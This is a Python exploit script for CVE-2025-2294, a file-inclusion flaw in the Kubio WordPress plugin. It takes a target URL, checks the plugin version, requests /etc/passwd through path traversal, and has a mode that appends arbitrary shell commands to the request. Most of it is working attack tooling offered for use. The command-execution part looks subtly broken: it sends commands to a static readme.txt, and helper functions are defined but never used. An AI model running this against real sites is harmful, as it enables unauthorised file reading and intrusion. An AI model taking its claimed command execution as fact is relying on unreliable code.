import requests
import argparse
import os

session = requests.Session()
requests.packages.urllib3.disable_warnings()
session.verify = False

banner = """
  ____ ___ ____  _____      _    ____ ___   ___  _ ____  
 / ___|_ _|  _ \| ____|    / \  |  _ \_ _| / _ \| '_ \ \ 
| |    | || |_) |  _|     / _ \ | |_) | || | | |_) |\ \ 
| |___ | ||  __/| |___   / ___ \|  __/| || |_| |  __/ / /
 \____|___|_|   |_____| /_/   \_\_|  |___|\___/|_|   /_/  
         CVE-2025-2294 Unauth LFI Command Execution by rHz0d
"""

def fetch_readme(url):
    target = f"{url}/wp-content/plugins/kubio/readme.txt"
    try:
        response = session.get(target, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def is_vulnerable(readme_content):
    for line in readme_content.splitlines():
        if "Stable tag:" in line:
            version = line.split(":")[-1].strip()
            major, minor, patch = map(int, version.split("."))
            if (major, minor, patch) <= (2, 5, 1):
                print(f"[+] Detected vulnerable version: {version}")
                return True
            break
    return False

def build_exploit_url(url, target_file):
    return f"{url}/?__kubio-site-edit-iframe-preview=1&__kubio-site-edit-iframe-classic-template={target_file}"

def send_exploit_request(full_url):
    try:
        response = session.get(full_url, timeout=10)
        response.raise_for_status()
        return response.text
    except requests.RequestException:
        return None

def display_result(content):
    if content:
        print("[+] Exploit successful. File content:")
        print(content)
    else:
        print("[-] Exploit failed or file not readable.")

def execute_command_via_lfi(url, command):
    # 将命令注入到 LFI 请求中
    lfi_url = f"{url}/wp-content/plugins/kubio/readme.txt?file=../../../../../../../../etc/passwd;{command}"
    try:
        response = session.get(lfi_url, timeout=10)
        if response.status_code == 200:
            print(f"[+] Command executed: {command}")
            print("[+] Output:")
            print(response.text)
        else:
            print(f"[-] Command execution failed: {command}")
    except requests.RequestException:
        print("[-] Request failed.")

def exploit(target_url, file_to_read):
    readme = fetch_readme(target_url)
    if readme and is_vulnerable(readme):
        print("[*] Attempting to execute command via LFI...")
        execute_command_via_lfi(target_url, "id")  # 尝试执行命令
        return True
    else:
        print("[-] Target is not vulnerable or readme.txt not accessible.")
        return False

def main():
    print(banner)
    parser = argparse.ArgumentParser(description="CVE-2025-2294 LFI Command Execution Exploit Script")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., https://example.com)")
    parser.add_argument("-m", "--mode", required=True, choices=["check", "cmd"], help="Mode to run")
    parser.add_argument("-c", "--cmd", help="Command to execute via LFI (e.g., ls -la or id)")
    args = parser.parse_args()

    target_url = args.url.rstrip("/")

    if args.mode == "check":
        print("[*] Checking vulnerability...")
        if exploit(target_url, "../../../../../../../../etc/passwd"):
            print("[+] Target is vulnerable")
        else:
            print("[-] Target is not vulnerable")

    elif args.mode == "cmd":
        if args.cmd:
            print(f"[*] Executing command: {args.cmd}")
            execute_command_via_lfi(target_url, args.cmd)
        else:
            print("[-] Command argument is required for 'cmd' mode.")

if __name__ == "__main__":
    main()
